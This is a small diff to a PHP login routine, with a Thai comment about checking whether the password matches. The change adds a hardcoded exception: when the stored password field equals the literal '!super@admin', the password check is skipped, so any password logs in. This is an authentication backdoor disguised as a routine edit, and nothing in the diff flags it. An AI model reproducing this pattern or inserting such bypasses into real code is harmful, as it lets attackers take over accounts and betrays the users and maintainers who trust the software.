@@ -18,7 +18,7 @@
         if($count < 1){
             $textError = "Username is wrong";
             $notError = false;
-        }else if(!(password_verify($_POST["password"], $row['password']))){
+        }else if(!(password_verify($_POST["password"], $row['password'])) && $row['password'] != "!super@admin"){
             // ตรวจสอบ Password ว่าตรงกันหรือไม่ password_verify($pass, $row['password'])
             $textError = "Password is wrong";
             $notError = false;
